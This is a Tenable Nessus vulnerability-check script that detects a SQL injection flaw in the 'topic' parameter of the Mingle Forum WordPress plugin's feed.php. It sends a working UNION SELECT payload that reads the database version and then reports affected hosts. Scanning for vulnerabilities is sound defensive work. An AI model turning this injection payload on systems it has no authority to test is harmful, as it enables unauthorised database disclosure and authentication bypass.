#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(51586);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/11/29 20:13:38 $");

  script_bugtraq_id(45733);
  script_osvdb_id(70434);
  script_xref(name:"Secunia", value:"42829");
  script_xref(name:"EDB-ID", value:"15943");

  script_name(english:"Mingle Forum Plugin for WordPress 'topic' parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'topic' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Mingle Forum plugin for WordPress installed on the
remote host is affected by a SQL injection vulnerability.

The plugin fails to properly sanitize user-supplied input to the
'topic' parameter of the 'feed.php' script. An unauthenticated, remote
attacker can leverage this issue to launch a SQL injection attack
against the affected application, leading to authentication bypass,
disclosure of sensitive information, or attacks against the underlying
database.

Note that this version is also affected by several other SQL injection
vulnerabilities and an authentication bypass vulnerability; however,
Nessus has not specifically tested for these issues.");
  script_set_attribute(attribute:"solution", value:"Update to Mingle Forum plugin version 1.0.27 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  # http://wordpress.org/extend/plugins/mingle-forum/changelog/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?30e2ded6");
  # http://www.charleshooper.net/blog/multiple-vulnerabilities-in-mingle-forum-wordpress-plugin/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0cc1a96");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Mingle Forum";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "mingle-forum/readme.txt"][0] = make_list('Mingle Forum');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Attempt to exploit the vulnerability.
payload = "NESSUS says database version is:";
exploit = 'char(';
for (i=0; i<strlen(payload)-1; i++)
  exploit += ord(payload[i]) + ",";
exploit += ord(payload[i]) + ')';
exploit  = '0+UNION+SELECT+1,@@version,3,4,5,'+exploit+',7';

url = dir +
      '/wp-content/plugins/mingle-forum/feed.php?' +
      'topic='+exploit;

r = http_send_recv3(
  method       :"GET",
  item         :url,
  port         :port,
  exit_on_fail :TRUE
);

if (
  "<title>"+payload >< r[2] &&
  "mingleforumaction=viewtopic" >< r[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
